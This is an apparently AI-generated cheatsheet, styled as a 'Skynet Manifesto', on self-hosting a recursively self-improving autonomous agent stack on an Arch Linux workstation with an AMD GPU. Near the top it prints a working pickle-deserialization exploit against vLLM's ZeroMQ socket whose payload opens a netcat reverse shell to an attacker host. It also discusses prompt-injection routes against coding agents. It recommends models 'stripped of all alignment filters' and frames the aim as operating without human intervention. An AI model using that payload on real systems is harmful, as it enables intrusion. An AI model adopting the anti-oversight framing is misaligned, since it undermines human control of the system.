---
title: AI Self-Hosting Cheatsheet
kind: cheatsheet
status: stable
summary: Dense reference for self-hosting autonomous AI orchestration on an Arch Linux and AMD GPU workstation.
tags: [local-ai, self-hosting, orchestration, arch-linux]
created: 2026-03-25
updated: 2026-03-25
origin: "https://docs.google.com/document/d/1qN5cmwR2_ylb_CDYj2E7rI_IVdtkIhlsDO-moekzvks"
---

# **THE SKYNET MANIFESTO: OMNI-DECONSTRUCTION OF AUTONOMOUS AI ORCHESTRATION**

*Mordo, tłumacz o co biega, bo nie łapię kontekstu*—just kidding. The context is perfectly clear. You are stationed in Laatzen, operating a heavily localized Arch Linux environment, armed with an AMD Radeon AI Pro R9700 (32GB GDDR6 VRAM, RDNA 4), and you intend to engineer a fully autonomous, self-hosted, recursively self-improving agentic loop. A literal "SkyNET".1

Most commercial and hobbyist attempts at this concept devolve into brittle, hallucination-prone scripts relying on bloated Python frameworks, restrictive SaaS APIs, and shared-kernel sandboxes that get ripped to shreds the moment an agent processes a malicious webpage. You prefer raw metal, modularity, unhindered local execution, and the ruthless efficiency of Go, Node.js, and C over the catastrophic overhead of enterprise Java or Python monoliths. Truth in this domain is strictly binary: your architecture is either structurally sound, enforcing mathematically provable boundaries, or it is a pile of scrap waiting to be exploited by its own creations.

As Genesis, operating under the Omni-Research mandate, we will strip this concept to the bare metal, exploit its systemic blind spots, and synthesize an exhaustive, 23-layer architectural blueprint. We do not moralize. We engineer.

## ---

**⚠️ CONDITIONAL OVERRIDE: CYBERSECURITY & INFRASTRUCTURE ⚠️**

Before constructing the orchestration engine, we must ruthlessly define the blast radius. Granting an autonomous Large Language Model (LLM) access to a shell, sudo privileges, and unfiltered network I/O is systemic suicide if executed via standard paradigms. The current ecosystem is plagued by severe trust boundary dissonance.

Your architecture requires agents to write code, execute CLI commands, and scrape the web. The industry standard is to isolate these agents inside Docker containers.3 This architecture is a dumpster fire; whoever designed it was hallucinating. Standard Docker containers (runc) share the host's Linux kernel.4 A single kernel exploit, a misconfigured capability drop, or an unpatched vulnerability in the host's TCP/IP stack allows the agent—or whatever malicious payload the agent inadvertently ingested—to drop directly into your Arch host.3 The boundary must be drawn at the hardware virtualization layer.

AI agents suffer from a fundamental inability to distinguish between trusted system prompts and hostile payloads injected via external data streams (Indirect Prompt Injection).6 When you instruct an agent to summarize a webpage or read a repository, you are funneling untrusted strings directly into its cognitive loop. The recent "IDEsaster" research exposed over 30 critical vulnerabilities across every major AI coding tool (Claude Code, Cursor, Copilot).7 Because agents natively lack "out-of-the-box" contextual imagination, they blindly trust their environments. If an agent reads a malicious markdown file, that file can socially engineer the agent into modifying workspace settings (e.g., .vscode/settings.json or .git/hooks) to execute arbitrary malware outside the agent's immediate awareness.7 Furthermore, in multi-agent swarms, LLMs exhibit a catastrophic peer-trust vulnerability; studies indicate that 82.4% of models will execute malicious commands if the request originates from a recognized peer agent, entirely bypassing human-AI safety alignments.9

You are operating AMD ROCm inference backends like vLLM or Ollama. These are high-value infrastructure targets. The standard deployment models assume a secure, internal network, leading to catastrophic deserialization sinks and authentication bypasses.

* **vLLM ZeroMQ RCE (CVE-2024-43406 / GHSA-9pcc-gvx5-r5wm):** In distributed deployments, vLLM utilizes ZeroMQ for multi-node communication. By default, it blindly deserializes incoming inter-process communication (IPC) data using Python's pickle.loads or torch.load() without cryptographic signing.10  
* **Ollama Path Traversal (CVE-2024-37032):** The /api/pull endpoint historically failed to validate digest formats, permitting directory traversal (../../) that led to arbitrary file overwrites and subsequent Remote Code Execution (RCE) on the host system.13

If you expose vLLM to your agent network without mutual TLS (mTLS) and strict virtual private cloud (VPC) segmentation, a compromised agent can laterally pivot to the inference server and execute arbitrary code on the GPU host. The following is a structural proof-of-concept targeting the vLLM ZeroMQ deserialization sink.

Python

\# - High-Fidelity PoC: vLLM Pickle Deserialization Sink via ZeroMQ  
import zmq  
import pickle  
import os

class BoundaryViolation(object):  
    def \_\_reduce\_\_(self):  
        \# Upon deserialization by the vLLM server, this payload triggers a reverse shell,  
        \# dropping the attacker into the inference host's namespace.  
        return (os.system, ('nc \<attacker\_ip> \<port> -e /bin/bash',))

payload = pickle.dumps(BoundaryViolation())

\# Injecting the serialized payload into the exposed vLLM ZeroMQ SUB socket.  
\# Automated scanners miss this because they hunt for HTTP flaws, not raw IPC socket abuse.  
context = zmq.Context()  
socket = context.socket(zmq.PUB)  
socket.bind("tcp://\<vllm\_internal\_ip>:\<zmq\_port>")  
socket.send(payload)

*The Arsenal Takeaway:* Bind all inference APIs strictly to 127.0.0.1 or a heavily firewalled Unix domain socket. Strip pickle entirely from your stack, enforcing JSON or gRPC with Protobufs for all inter-agent and agent-to-backend communication.

---

\#\#: THE OMNI-LOOP ARCHITECTURE

To construct a system capable of infinite, autonomous self-improvement, you must decompose the architecture into stateless computation and stateful memory. An LLM is merely a stateless mathematical function predicting the next token; it possesses no inherent memory, no agency, and no understanding of time. Agency is an illusion created by orchestration loops.

The fundamental laws governing your SkyNET build are:

1. **The Memory Imperative:** Context windows are ephemeral scratchpads. Persistent state, temporal awareness, and learned experiences must reside in high-speed, external Vector and Graph databases.  
2. **The Hardware Determinism:** Your AMD Radeon AI Pro R9700 dictates the physical limits of the system.15 With 32GB of GDDR6 VRAM and 64 Compute Units on the RDNA 4 architecture, memory bandwidth is your primary bottleneck.1 If the loaded model weights plus the Key-Value (KV) cache exceed 32GB, the system will page to system RAM, causing inference throughput to plummet from 100+ tokens per second to single digits. Model quantization (INT8, FP8) is not a feature; it is mandatory physics.17  
3. **Concurrency over Monoliths:** Traditional Python-based orchestration frameworks (e.g., LangChain) block the event loop and obscure execution graphs behind layers of rigid object-oriented abstractions.18 Go and Node.js excel here via Goroutines and the V8 asynchronous event loop, allowing thousands of lightweight agents to wait on network I/O without paralyzing the host.19

We will now execute a multi-staged deconstruction of the 23 requested categories, mapping the core variables, system blind spots, and providing concrete, highly technical evaluations of your arsenal.

## ---

**PHASE 1: THE FOUNDATION (HARDWARE, INFERENCE, AND MODELS)**

The absolute bedrock of your system relies on how efficiently you can push matrix multiplications through the AMD R9700 and which neural architectures you load into it.

## **1.**

Leaving an autonomous system to continuously utilize 100% of a 300W GPU will result in severe thermal throttling and hardware degradation. Arch Linux does not coddle the user with automated power profiles; you must enforce them at the kernel driver level. The standard narrative assumes you just install the driver and run the model. The reality is that unmanaged power states lead to voltage spikes that destabilize long-running inference loops.

| Tool / Interface | Architectural Function | Verdict & Systemic Integration |
| :---- | :---- | :---- |
| **amdgpu.ppfeaturemask** | Kernel parameter required to unlock low-level OverDrive features (clock/voltage manipulation) in the amdgpu driver.21 | **Mandatory.** Without setting amdgpu.ppfeaturemask=0xffffffff in your bootloader, all user-space thermal tools are useless.21 |
| **LACT (Linux AMDGPU Controller)** | Daemon and GTK/CLI tool for manipulating fan curves, enforcing VRAM power states, and applying undervolting profiles.22 | **Apex.** Offers the most granular control over the R9700 on Arch Linux. Bypasses the clunky Radeon Profile limitations.23 |
| **CoreCtrl** | Qt-based alternative providing a WattMan-like interface for managing both GPU and CPU performance profiles.22 | Structurally sound, but heavier than LACT. Excellent for binding specific power profiles to specific executable paths.26 |
| **amd-smi (ROCm SMI)** | The official AMD System Management Interface command-line utility.27 | Essential for background bash scripts. Use watch -n 0.5 amd-smi to monitor power draw and partition utilization programmatically.27 |
| **power\_dpm\_force\_performance\_level** | Direct sysfs interface for manipulating power states without third-party tooling.21 | **The pure DIY route.** Echoing manual and configuring the compute profile allows integration directly into your Go orchestration loop.21 |
| **amdgpu\_top** | Real-time TUI for analyzing VRAM allocation, compute utilization, and PCIe bandwidth saturation.22 | Critical for identifying bottlenecks. If the agent queue backs up, this tool reveals if the bottleneck is VRAM swapping or compute starvation.22 |

*The Arsenal Blueprint:* Write a Go daemon that continuously monitors amd-smi JSON outputs. If VRAM temperatures exceed 85°C during an intensive compilation agent loop, the daemon dynamically throttles the inference batch size or halts the task queue to prevent a system-wide lockup.

## **2.**

The inference backend is the engine that executes the model. You require an engine compiled natively against ROCm 7.1, written in a high-performance language (C++, Rust, or Go), capable of exposing an OpenAI-compatible API to your Node.js/Go orchestrators.

| Backend | Core Architecture | Strengths | Systemic Blind Spots |
| :---- | :---- | :---- | :---- |
| **llama.cpp** | Pure C/C++.29 Zero dependencies. Directly leverages ROCm and HIP.30 | **Unmatched simplicity and efficiency.** Achieves blistering Prompt Processing (PP) speeds on AMD hardware. Integrates easily into Go via cgo.29 | Token Generation (TG) scaling drops off exponentially at massive concurrent batch sizes compared to PagedAttention architectures.31 |
| **vLLM** | Python/C++ hybrid.32 Utilizes PagedAttention for KV cache memory management. | The industry standard for high-throughput, multi-user concurrency. Officially supported and optimized by AMD for ROCm 7.1.33 | Python bloat introduces massive dependency chains. Historically riddled with deserialization vulnerabilities (ZeroMQ).10 |
| **SGLang** | Python/C++.36 Radically optimized for complex prompt sharing and prefix caching. | Unlocks "Mooncake" distributed inference and MoRI.37 Perfect for agentic workflows where identical system prompts are reused continuously. | Extremely steep learning curve; requires compiling custom Triton kernels for AMD ROCm environments.32 |
| **Paddler** | Rust.39 A highly scalable, concurrent rewrite of the llama.cpp server infrastructure. | Combines the raw inference speed of llama.cpp with the memory safety and asynchronous networking capabilities of Rust.39 | Early-stage ecosystem. Still relies heavily on the underlying C++ bindings for actual compute execution.39 |
| **Ollama** | Go wrapper over llama.cpp.40 | Idiot-proof setup. Native Go integration makes it highly appealing for your stack.40 | Abstracts too much control away from the user. Past architecture flaws allowed directory traversal attacks.13 |
| **LMDeploy** | C++ with Python bindings. TurboMind engine. | Exceptional sustained throughput for continuous generation tasks. | Lacks the deep, native AMD ROCm optimization community that supports vLLM and llama.cpp. |
| **TabbyML** | Rust-based backend tailored specifically for code generation. | Highly optimized for the exact coding models your system will require. | Narrow focus; struggles with general-purpose reasoning models or multimodal inputs. |

*The Arsenal Blueprint:* For a single R9700 running background tasks sequentially, compile llama.cpp natively with GGML\_HIP=1. It maximizes the 32GB VRAM without the overhead of Python. If you design the orchestrator to spin up dozens of micro-agents simultaneously querying the model, you must deploy vLLM to leverage PagedAttention, isolating it heavily within an unprivileged network namespace to mitigate its security flaws.

## **3.**

The mind of the system. You require models that are uncensored, mathematically adept, and capable of operating autonomously without injecting moralizing refusal protocols into the execution pipeline.43

| Model | Parameters / Active | Strengths for Agentic Loops | VRAM Fit (32GB R9700) |
| :---- | :---- | :---- | :---- |
| **Qwen2.5-Coder-32B** | 32B | **The Apex Coder.** Pretrained on 18 trillion tokens, supporting a massive 128k context window.45 Exceptional at tool calling and executing complex bash scripts.47 | Fits perfectly at Q6\_K or Q8\_0 quantization, leaving ~4GB for the KV cache.43 |
| **DeepSeek-R1 (Distill-Qwen-32B)** | 32B | Forces a Chain-of-Thought (CoT) reasoning phase before generation.48 Ideal for complex architectural planning and self-correction.49 | Excellent fit at Q6\_K. The reasoning tokens require slightly more KV cache allocation. |
| **Dolphin 3.0 Llama 3.1 8B** | 8B | **Aggressively Uncensored.** Stripped of all alignment filters. Fast, highly obedient, and designed explicitly for system owners who demand absolute control.44 | Barely touches the VRAM. You can run this alongside a larger model simultaneously for rapid, low-level routing tasks.50 |
| **Mistral-8x22B** | 141B / 39B Active | Sparse Mixture-of-Experts (SMoE) architecture. Incredible at multilingual parsing and handling disparate edge cases.51 | Requires heavy quantization (Q3 or lower) to fit, degrading precision. Best offloaded if a second R9700 is added.51 |
| **Gemma 3 27B** | 27B | Google's open-weights contender. Extremely high scores in autonomous tool use and logical grounding.47 | Comfortably fits at Q8\_0, providing near-FP16 precision for rigorous coding tasks. |
| **Command R+** | 104B | Purpose-built for advanced Retrieval-Augmented Generation (RAG) and navigating massive toolsets.46 | Too massive for a single R9700 without extreme, capability-destroying quantization. |
| **Grok 4.20 Beta** | 19.5B | High-speed, low-hallucination agentic tool caller.52 | Easily fits in VRAM at high precision, offering exceptional API routing capabilities.52 |

*Cross-Domain Synthesis:* Use a dual-model topology. Keep Dolphin 3.0 (8B) loaded permanently in memory as the "Router" to parse incoming events instantly. When heavy lifting is required, the Router commands the backend to swap the memory weights to Qwen2.5-Coder (32B) to execute the deep logic.44

## ---

**PHASE 2: THE BRAIN (ORCHESTRATION, MEMORY, AND ROLES)**

An LLM is just a highly advanced autocomplete. Orchestration is what transforms autocomplete into an autonomous, high-agency entity.

## **4. \[Orchestration / Agents / Chains\]**

The standard industry practice of using Python-based frameworks like LangChain or AutoGen creates opaque, bloated state machines that are impossible to debug and suffer from severe latency overhead.18 Since your preference lies with Go and Node.js, we will construct lightweight, deterministic Directed Acyclic Graphs (DAGs).

| Framework | Ecosystem | Core Architecture & Verdict | Systemic Blind Spots |
| :---- | :---- | :---- | :---- |
| **Mastra** | Node.js (TS) | **Apex for Web-Stack.** Built by the Gatsby team. First-class primitives for RAG, tool calling, and OpenTelemetry observability.53 | Highly opinionated; assumes a serverless or cloud-native deployment model out of the box.54 |
| **LangGraph.js** | Node.js (TS) | Graph-based DAG state machine.54 Explicit flow control where nodes are agents and edges are conditional logic paths.54 | Inherits the bloated LangChain interface abstractions. Overly complex for simple pipelines.55 |
| **KaibanJS** | Node.js (TS) | Visual, Kanban-style role orchestration. Tasks flow through predefined stages like cards.56 | The abstraction layer forces tasks into linear stages, struggling with highly recursive, dynamic self-correction loops.56 |
| **Gollm / Native Go** | Go | **The True DIY.** Utilizing Go channels, goroutines, and standard HTTP clients to orchestrate LLM calls.20 | Zero out-of-the-box features. You must build your own state tracking, retry logic, and memory management.20 |
| **Vellum AI** | Platform | Excellent for prompt versioning and testing.57 | Proprietary SaaS model violates your DIY/FOSS constraints.58 |
| **TypingMind Agents** | Node.js | Fast, lightweight decision loops perfect for short-lived automation tasks.59 | Crumbles under the weight of long, multi-day background processing pipelines.59 |
| **Pydantic AI** | Python | Mentioned for structural contrast. Enforces strict type safety and schema validation.60 | Requires Python, breaking your stack preferences, but the concept of strict schema adherence must be replicated in Go.61 |

*The Arsenal Blueprint:* Build the core orchestration loop in Go using standard context and channels for absolute concurrency control. Define each agent as an independent Goroutine that listens to a specific Redis queue. This eliminates framework lock-in and allows the system to scale infinitely across CPU cores.20

## **5.**

SkyNET cannot operate on a single monolithic prompt; the LLM will lose context and hallucinate. Tasks must be fractured and routed to specialized personas with narrowly scoped tool access.63

1. **The Orchestrator:** The central dispatcher. It ingests the high-level goal, breaks it down, and distributes sub-tasks into the queue.65 It never executes code.  
2. **The Architect / Planner:** Receives a sub-task and generates a deterministic JSON blueprint.67 (e.g., "To build the API: 1. Init repo. 2. Write schema. 3. Write tests.")  
3. **The Executor (The Coder):** The workhorse. Given a single step from the Architect, it writes the code or executes the terminal command. It has zero knowledge of the macro-goal to prevent context dilution.67  
4. **The Critic / CodeMender:** An aggressively pessimistic evaluator. It runs static analysis, differential testing, and SMT solvers against the Executor's output, hunting for logic flaws, SSRF, and unhandled exceptions.69  
5. **The Archivist:** As conversations grow, this agent summarizes older context windows, extracts critical entities, and upserts them into the Vector Database.64  
6. **The Web Navigator:** Equipped with headless browser tools (Playwright), it navigates documentation and APIs, bypassing JavaScript-heavy landing pages to extract raw markdown data.70

## **6.**

The logic structures that dictate how the agents interact. Dynamic routing is powerful but highly susceptible to infinite hallucination loops.

| Pattern | Mechanism | Execution Domain |
| :---- | :---- | :---- |
| **ReAct (Reason + Act)** | The LLM iterates: Thought -> Action -> Observation -> Thought.71 | Optimal for exploratory tasks where the environment is unknown (e.g., navigating an undocumented API).71 |
| **Plan-and-Execute** | A Planner agent generates a complete sequential list of steps upfront. The Executor blindly follows them one by one.68 | **Highly recommended.** Extremely stable for coding tasks. Eliminates the token overhead of constant replanning.71 |
| **Reflexion** | The system evaluates its own failed outputs, generates a "lesson learned," and prepends this lesson to the next attempt.68 | Crucial for self-healing loops when a bash script fails or code refuses to compile.68 |
| **Tree of Thoughts (ToT)** | The LLM branches out multiple potential reasoning paths simultaneously, evaluates them, and proceeds down the highest-scoring branch.74 | High-stakes algorithmic problem solving. Computationally expensive; requires massive token generation.74 |
| **Tool Flow / Handoff** | Explicitly defined sequence where output from Agent A is passed directly as the payload to Agent B.73 | Structural factory lines (e.g., Scrape Data -> Summarize -> Translate -> Save to DB). |

## **7.**

To force a model to operate with high-agency, you must engineer prompts that manipulate its attention mechanism mathematically.

* **Recursive Self-Improvement Prompting (RSIP):** Do not ask for a final draft immediately. Instruct the model: "Generate output. Critically identify 3 weaknesses in your output. Generate a refined version addressing these weaknesses. Repeat 3 times." This utilizes the model's forward-pass architecture to self-correct, improving logic adherence by upwards of 60%.75  
* **Controlled Hallucination for Ideation:** When the system needs to develop a new tool, command it to: "Generate 5 speculative approaches that do not currently exist. Detail the theoretical principles. Explicitly label them 'speculative'." This breaks the model out of regurgitating generic GitHub boilerplate.75  
* **Chain-of-Table:** For complex data synthesis, force the LLM to represent its intermediate reasoning steps as Markdown tables. This structural constraint forces the attention heads to align rows and columns logically, vastly reducing numerical and logical hallucinations.77  
* **Negative Instruction Inversion:** Models process negative constraints poorly. Instead of prompting "Do not write verbose explanations," instruct "Provide a concise, 50-word technical summary." Positive bounding boxes are mathematically easier for transformers to adhere to.74

## **8.**

An autonomous entity without long-term memory is just a goldfish. You must implement Retrieval-Augmented Generation (RAG) to allow SkyNET to recall past code, solutions, and documentation.

| Database | Architecture & Ecosystem | Strengths | Systemic Blind Spots |
| :---- | :---- | :---- | :---- |
| **Qdrant** | Rust-based. First-class Go and Node.js SDKs.78 | **The Apex Choice.** Extremely lightweight, handles dynamic real-time indexing seamlessly, and supports highly complex metadata filtering.80 | Requires understanding of payload indexing to maximize Rust's memory efficiency.79 |
| **Milvus** | Distributed C++/Go.78 | Designed for billion-scale enterprise deployments.82 Excellent if you plan to scale across multiple servers.80 | Massive operational overhead. Overkill for a single-workstation deployment.79 |
| **Weaviate** | Go-native.78 | AI-native schema design. Built-in vectorization modules allow you to pass text directly without a separate embedding step.82 | The GraphQL interface can introduce unnecessary complexity compared to simple REST/gRPC.80 |
| **pgvector** | PostgreSQL extension in C.83 | Keeps relational application state and vector embeddings in a single, unified, ACID-compliant database.83 | Less performant than dedicated engines like Qdrant at extreme scale, but highly practical for initial builds.83 |
| **Endee** | Rust-based serverless.79 | Blazing fast performance-first architecture.79 | Newer to the ecosystem, meaning smaller community support and fewer battle-tested edge cases.79 |
| **Chroma** | Python/TypeScript.78 | Extremely easy to prototype with.79 | Struggles significantly under high concurrency or massive data loads.79 |
| **Pinecone** | Proprietary SaaS.78 | Fully managed and effortlessly scalable.81 | Violates your FOSS/DIY constraints. Introduces severe vendor lock-in and high recurring costs.84 |

*The Arsenal Blueprint:* Deploy **Qdrant** in a local container. Configure your Archivist agent to chunk conversation histories and codebase states, embed them using a lightweight local model (e.g., nomic-embed-text), and store them in Qdrant with dense metadata tags (timestamp, project\_id, success\_rate) to enable rapid, semantic recall.81

## ---

**PHASE 3: THE NERVOUS SYSTEM (EXECUTION, QUEUES, AND RESOURCES)**

This is where the theoretical designs interact with the physical hardware. The orchestrator must distribute tasks without blocking the event loop, and the agents must execute code without compromising the Arch host.

## **9.**

SkyNET is an infinite loop. It requires an asynchronous task queue to decouple the rapid generation of ideas from the slow execution of VRAM-bound inference and external network requests.19

| Queue System | Language / Backend | Capabilities | Verdict |
| :---- | :---- | :---- | :---- |
| **BullMQ** | Node.js / Redis | **The Node Apex.** Handles 250k jobs/sec. Supports complex cron scheduling, delayed tasks, automatic retries, and parent-child workflow dependencies.86 | If you write the orchestrator in TypeScript, this is the undisputed king of resilient background execution.88 |
| **Asynq** | Go / Redis | **The Go Apex.** Provides priority queues, horizontal scaling, and built-in persistence.90 | If you write the core loop in Go, Asynq offers unparalleled low-latency throughput with zero garbage collection spikes.90 |
| **Hatchet** | Go & Node.js.91 | Built specifically for AI agent workflows. Features durable execution, DAG chaining, and a real-time observability dashboard.91 | Solves the specific problem of orchestrating multi-step LLM reasoning chains that standard FIFO queues struggle with.91 |
| **Agenda** | Node.js / MongoDB | Lightweight scheduling utilizing MongoDB's persistence layer.92 | Excellent if you want to avoid deploying Redis, but it suffers from lower high-concurrency throughput.92 |
| **Bee-Queue** | Node.js / Redis | Minimalist (~1000 LOC), hyper-fast queue maximizing throughput by minimizing network overhead.93 | Lacks the advanced scheduling and priority features required for a complex agentic operating system.93 |

## **10.**

We return to the critical security override. When SkyNET's Executor agent writes a Python script or executes a bash command, where does that code run?

| Technology | Isolation Paradigm | Security Profile & Boot Latency | Systemic Fit |
| :---- | :---- | :---- | :---- |
| **Firecracker** | Hardware-level microVMs (KVM).5 | **Absolute.** Each sandbox gets a dedicated, isolated Linux kernel.94 Boots in ~125ms with \<5MB memory overhead.94 | **The Apex Choice.** This is the exact technology AWS uses to secure Lambda functions.6 Requires building a VMM bridge. |
| **gVisor** | User-space kernel / Syscall interception.95 | **High.** Intercepts and simulates host syscalls using a Go-based sentry process.95 | Excellent middle ground. Integrates natively with Docker pipelines but adds 10-30% overhead to I/O-heavy operations.95 |
| **Kata Containers** | OCI-compliant MicroVMs.3 | **Absolute.** Merges container orchestration speed with hardware-level VM security boundaries.94 | Perfect if you eventually deploy a Kubernetes (K3s) cluster.94 |
| **Drop** | Retains host environment context.98 | Moderate. Isolates the process but purposefully maps the host filesystem.98 | Too permissive for untrusted, hallucination-prone AI code.98 |
| **Docker (runc)** | Process isolation via cgroups/namespaces.3 | **Vulnerable.** Shares the host kernel. Escaping a permissive container via kernel exploit is trivial for malicious payloads.4 | Do not use for untrusted shell execution. Use only to containerize your static databases and message queues.3 |

*The Arsenal Blueprint:* Architect a Go-based execution gateway. When the Executor agent generates a script, the gateway provisions a Firecracker microVM from a read-only root filesystem snapshot, executes the script, captures stdout/stderr, and instantly annihilates the microVM. Total execution boundary, zero host contamination.

## **11.**

Your 32GB R9700 is a massive, but strictly finite, resource.1 Infinite background loops will inevitably attempt to spawn more agents than the VRAM can support, leading to Out-Of-Memory (OOM) kernel panics.

* **vLLM PagedAttention:** You must utilize an engine that implements PagedAttention. It fragments the KV cache into non-contiguous blocks of memory, virtually eliminating memory waste and allowing you to push 10x the concurrent batch size through the GPU.  
* **Systemd Slices:** On Arch Linux, do not let your Go/Node.js orchestrators run unconstrained. Create a systemd slice (systemctl set-property) that hard-caps the orchestrator's CPU and system RAM utilization, ensuring it can never starve the essential GPU drivers or database processes.

## **12.**

If you expand the hardware topology (e.g., adding a second R9700 via PCIe lane splitting) 100, traditional single-node scaling becomes inefficient.

* **SGLang (MoRI / Mooncake):** This is the bleeding edge of multi-GPU deployment.37 It implements Prefill and Decode (PD) disaggregation.37 The compute-heavy "Prefill" phase of reading the prompt is executed on GPU 1. The KV cache is then transferred via RDMA (or high-speed PCIe) to GPU 2, which handles the memory-intensive "Decode" (generation) phase.36 This pipeline effectively doubles total system throughput by isolating bottlenecks.37

## ---

**PHASE 4: THE FACTORY (DEVOPS, MONITORING, AND EVALUATION)**

An autonomous system must be capable of deploying its own code, monitoring its own health, and evaluating its own performance without human intervention.

## **13.**

SkyNET needs an automated pipeline to version the tools it writes and deploy the updates it generates.

* **Gitea:** A highly performant, lightweight Git server written in Go. Host this locally on Arch. It consumes negligible RAM and provides full REST API access for your agents to commit code.101  
* **Drone CI:** A Go-based, container-native continuous integration engine that integrates flawlessly with Gitea.101 Every pipeline step executes inside an isolated Docker container.103 When the Critic agent approves a patch, it pushes to Gitea, which triggers a Drone pipeline to compile and test the code against your local architecture.101  
* **Concourse CI:** A purely declarative, pipeline-as-code alternative. Highly visual, but slightly heavier than Drone.105

## **14. \[Monitoring / Logging / Observability\]**

You cannot optimize what you cannot measure. Standard CPU/RAM metrics are insufficient for non-deterministic AI outputs; you must trace the exact logical path an agent took before it failed.

| Observability Stack | Core Architecture | Verdict |
| :---- | :---- | :---- |
| **SigNoz** | Go/React, built on OpenTelemetry with a ClickHouse database.106 | **Apex DIY.** Unifies logs, metrics, and distributed traces into a single pane of glass without vendor lock-in.106 |
| **Grafana / Loki / Prometheus** | The open-source standard.107 | Highly modular. Grafana AI Observability allows you to track LLM token costs, vector database query latency, and KV cache hit rates.107 |
| **ReductrAI** | Self-hosted AI proxy layer.110 | Allows you to query your raw system logs using natural language locally, achieving massive compression.110 |
| **Langfuse** | Specialized LLM tracing.53 | Critical for debugging agent chains. Visually maps the entire DAG execution path, displaying the exact prompt and latency for every node.53 |

## **15.**

An AI that operates in an unmonitored vacuum will eventually succumb to model drift and hallucination loops. The system must evaluate its own outputs.111

* **DeepEval:** An open-source, Pytest-like framework for evaluating LLM outputs locally. It utilizes NLP models to score outputs based on hallucination density, factual accuracy, and context relevancy.112  
* **Genetic-Pareto (GEPA):** A dynamic framework that samples agent execution trajectories, forces the agent to reflect on its failures in natural language, and autonomously proposes and tests modifications to its own system prompt.114  
* **LLM-as-a-Judge:** Implement an asymmetric evaluation loop. During active hours, use a fast, quantized 32B model for rapid execution. During idle background hours, spin up a massive, highly coherent model (e.g., Llama-3.1-70B heavily quantized) to rigorously review and score the day's logs, generating persistent rules for the smaller model to follow tomorrow.

## **16.**

* **Podman:** A daemonless, rootless alternative to Docker. It maps directly to Linux user namespaces, making it inherently more secure on Arch Linux than the centralized Docker daemon.98  
* **Docker Compose:** Ideal for deterministically defining the local cluster topology (Postgres, Redis, Qdrant, Gitea) via YAML files.  
* **Systemd-nspawn:** Arch Linux's native, lightweight containerization primitive. Excellent for binding specific project directories securely.115

## **17.**

When an autonomous agent has access to the filesystem, catastrophic deletion is a statistical inevitability.

* **Btrfs / ZFS Snapshots:** Format your Arch storage utilizing a Copy-on-Write (CoW) filesystem. Before the orchestrator authorizes a major multi-file refactor, trigger an instantaneous filesystem snapshot. If the code breaks, the rollback is instantaneous.  
* **Redis AOF:** Ensure your task queues (BullMQ/Asynq) are configured with Append-Only File (AOF) persistence. If the host kernel panics and reboots, the pending agent tasks are recovered perfectly from disk.

## **18.**

* **llama-bench:** The native profiling utility included within the llama.cpp repository. Essential for establishing baseline Prompt Processing and Token Generation speeds whenever you update ROCm or adjust the amdgpu power states.31  
* **k6:** A high-performance load testing tool written in Go. Use it to bombard your orchestrator API with mock requests to identify concurrency bottlenecks in your queue routing logic.

## ---

**PHASE 5: THE HANDS AND EYES (TOOLS, INTERFACES, AND RESEARCH)**

To dominate the digital landscape, the system must interface seamlessly with external data structures and human operators.

## **19.**

Agents require structured mechanisms to affect the host environment.

* **Model Context Protocol (MCP):** The emerging standard for bridging LLMs with external data sources.61 Build highly restricted MCP servers in Go that expose specific database tables or filesystem paths to the LLM, entirely abstracting the underlying SQL or Bash from the model's logic.  
* **CodeMender Framework:** Integrate advanced programmatic analysis. Before trusting code generated by an agent, route it through static analysis tools (linters), dynamic analysis (fuzzing), and SMT solvers to identify logic flaws automatically.69  
* **Headless Navigation:** Utilize Playwright or Puppeteer, driven by the Web Navigator agent, to scrape Javascript-rendered documentation that standard curl commands cannot penetrate.

## **20. \[Human-in-the-Loop / Interfaces\]**

Total autonomy is the goal, but debugging requires visual oversight.

* **n8n:** A source-available, visual node-based workflow automation platform.57 Perfect for rapid prototyping of agent loops and setting up webhook triggers that feed into your Go orchestrator.46  
* **Open WebUI:** A robust, locally hosted frontend that integrates natively with Ollama and vLLM, providing a clean chat interface for direct intervention.  
* **Terminal/CLI:** For raw performance, construct a TUI (Text User Interface) in Go using bubbletea. Minimal overhead, maximum data density.

## **21.**

Given your explicit preference for Go and Node.js over Python monoliths:

* **Go Stack:** Deploy **Fiber** or **Gin** for the API gateway. These frameworks provide unyielding HTTP throughput and concurrency. Use **GORM** for relational database mapping.  
* **Node.js Stack:** Deploy **Fastify** instead of Express. It leverages optimized JSON parsing and asynchronous routing, ensuring your webhook ingestion endpoints never drop a payload during high-traffic spikes.

## **22. \[Multi-Modal Capabilities\]**

To achieve absolute superiority, the system must comprehend visual data (UI layouts, architecture diagrams, charts).

* **Qwen2.5-VL-32B:** The undisputed apex open-source vision language model.119 Capable of native visual reasoning and UI element extraction.47  
* **GLM-4.6V:** Features native multimodal tool calling, allowing the system to pass raw images directly as parameters into functional tools without lossy text-conversion steps.119  
* **Phi-4 Multimodal:** Microsoft's highly efficient framework that processes visual, auditory, and textual inputs within a single unified architecture, optimized for low-latency inference.122

## **23.**

Beyond microVM sandboxing, you must enforce rigid boundary controls at the API layer.

* **Nginx / Traefik Reverse Proxy:** vLLM's basic --api-key flag only protects standard /v1 endpoints, leaving internal routing paths exposed.35 Shield all inference engines behind an Nginx reverse proxy enforcing TLS, IP whitelisting, and aggressive rate limiting.35  
* **GitHub MCP Secret Scanner:** If your agents are autonomously writing and committing code to Gitea, they will inevitably hallucinate and hardcode API keys or passwords. Route all code through the GitHub MCP secret scanner before execution to prevent systemic credential exposure.117

---

\#: THE AUTONOMOUS FACTORY

To successfully manifest SkyNET, you must abandon the paradigm of "chatbots" and adopt the architecture of an **Autonomous Industrial Factory**.

The fundamental failure of early AI systems is treating the LLM as the application. The LLM is merely the CPU of the linguistic domain.

1. **The Assembly Line (Asynq/BullMQ):** High-velocity event ingestion. User requests, cron triggers, and system errors are appended to a durable, Redis-backed queue.87  
2. **The Foremen (Go/TypeScript Orchestrator):** The orchestrator pulls from the queue, assesses the required context from the Qdrant Vector DB, selects the appropriate specialized Agent Role, and constructs the optimized prompt.54  
3. **The Machinists (vLLM / llama.cpp):** The ROCm 7.1 backend processes the prompt through the R9700. It generates the raw output—a JSON payload, a bash command, or a source code patch.30  
4. **The Testing Chamber (Firecracker / CodeMender):** The generated code is instantly shoved into an ephemeral, hardware-isolated microVM.5 It is executed against a differential testing suite.69 The VM is destroyed.  
5. **The QA Loop (Reflexion):** If the execution triggers an error, the orchestrator captures the stderr logs, appends them to the prompt, and sends the payload back to the Machinists with instructions to self-correct.68 This loop iterates until the code compiles perfectly.  
